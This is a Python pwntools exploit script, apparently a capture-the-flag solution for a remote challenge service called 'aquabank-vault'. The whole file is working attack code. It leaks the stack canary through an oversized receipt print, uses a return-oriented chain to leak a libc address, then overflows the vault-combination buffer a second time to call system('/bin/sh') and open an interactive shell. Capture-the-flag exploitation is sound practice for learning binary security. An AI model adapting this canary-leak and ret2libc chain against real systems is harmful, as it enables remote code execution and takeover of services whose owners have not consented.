#!/usr/bin/env python3
from pwn import *

# From checksec:
# Stack:      Canary found   =>  we should bypass the stack canary to exploit the buffer overflow vulnerability
# PIE:        No PIE (0x400000) =>  addresses are static and can be used directly in the exploit

context.binary = elf = ELF('./aquabank-vault', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

p = remote("offsec.m0lecon.it", 13552)

# By running: ROPgadget --binary ./aquabank-vault | grep "ret"
# we find that:
RET_GADGET = 0x40101a

# Static binary addresses (no PIE)
PRINT_RECEIPT_ADDRESS = elf.sym['print_receipt']   # or run: nm ./aquabank-vault | grep "print_receipt"
OPEN_VAULT_ADDRESS = elf.sym['open_vault']         # or run: nm ./aquabank-vault | grep "open_vault"

# Libc offsets (from the provided libc.so.6)
LIBC_MAIN_RET = 0x2a1ca           # offset of the insn after `call rax` (-> main) in __libc_start_call_main  ->  this is main()'s return address
                                  # NOTE: this is the same offset found in some previous challenges
                                  
LIBC_POP_RDI = 0x10f78b           # run: ROPgadget --binary ./libc.so.6 | grep "pop rdi ; ret"
LIBC_SYSTEM = libc.sym['system']  # or run: nm -D libc.so.6 | grep "system"
LIBC_BINSH = next(libc.search(b'/bin/sh\x00'))


# =====================================================
# STEP 1: call print_receipt() to leak the stack canary
# =====================================================
p.recvuntil(b"> ")
p.sendline(b"1")   # choose "Print receipt"
p.recvuntil(b"Type the receipt header (up to 64 chars):\n")
p.send(b"A")       # send 1 byte so read() returns; buf[1..63] = junk on stack

p.recvuntil(b"--- RECEIPT ---\n")
leak = p.recv(256)       # receive exactly 256 bytes (since fwrite(..., 256, ...) emits 256 bytes)

OFFSET_BUF_TO_CANARY = 64 + 8   # 64 bytes for the buffer 'buf' + 8 bytes for alignment

canary = u64(leak[OFFSET_BUF_TO_CANARY : OFFSET_BUF_TO_CANARY + 8])     # the LSB of the canary is always 0x00
log.success(f"leaked canary = {hex(canary)}")

# =======================================
# STEP 2: exploit the BOF in open_vault()
# =======================================
p.recvuntil(b"> ")
p.sendline(b"2")    # choose "Open vault"

OFFSET_COMBO_TO_CANARY = 128 + 8     # 128 bytes for the buffer 'combo' + 8 bytes for alignment
OFFSET_COMBO_TO_RIP = OFFSET_COMBO_TO_CANARY + 8 + 8   # 8 bytes for the canary + 8 bytes for the saved RBP

p.recvuntil(b"Enter your combination:\n")
payload = flat(
    b'A' * OFFSET_COMBO_TO_CANARY,
    p64(canary),
    b'A' * (OFFSET_COMBO_TO_RIP - OFFSET_COMBO_TO_CANARY - 8),  # 8 bytes for the saved RBP
    p64(PRINT_RECEIPT_ADDRESS),     # call print_receipt() to leak libc address via the same vulnerability we used in step 1
    p64(OPEN_VAULT_ADDRESS)         # after print_receipt() returns, execution will continue in open_vault()
)
p.send(payload)

# =========================================================
# STEP 3: call print_receipt() again to leak a libc address
# =========================================================

# NOTE: at the second call we will have more stuff on the stack to leak
# (that's why we built the previous payload in step 2 to call print_receipt() again),
# including a libc return address that we can use to compute libc base address.

p.recvuntil(b"Type the receipt header (up to 64 chars):\n")
p.send(b"A")    # trigger fwrite() again

p.recvuntil(b"--- RECEIPT ---\n")
leak2 = p.recv(256)

# Print all the leaked 8-byte values that look like libc addresses (i.e. that start with 0x7f)
for off in range(0, len(leak2)-8, 8):
    val = u64(leak2[off:off+8])

    if 0x7f0000000000 <= val <= 0x7fffffffffff:
        print(f"{off:#x}: {val:#x}")

# By trying one by one the leaked values that look like libc addresses,
# we find that the leak at offset 0x90 (144) is a libc return address
INDEX = 144   # 0x90
libc_leak = u64(leak2[INDEX : INDEX + 8])

libc_base = libc_leak - LIBC_MAIN_RET

log.success(f"libc leak = {hex(libc_leak)}")
log.success(f"libc base = {hex(libc_base)}")

pop_rdi = libc_base + LIBC_POP_RDI
system = libc_base + LIBC_SYSTEM
binsh = libc_base + LIBC_BINSH

# ========================================================================
# STEP 4: exploit again the BOF in open_vault() and call system("/bin/sh")
# ========================================================================
p.recvuntil(b"Enter your combination:\n")

payload = flat(
    b'A' * OFFSET_COMBO_TO_CANARY,
    p64(canary),
    b'A' * (OFFSET_COMBO_TO_RIP - OFFSET_COMBO_TO_CANARY - 8),  # 8 bytes for saved RBP
    p64(RET_GADGET),
    p64(pop_rdi), p64(binsh),  # prepare argument for system()
    p64(system)
)
p.send(payload)

p.interactive()
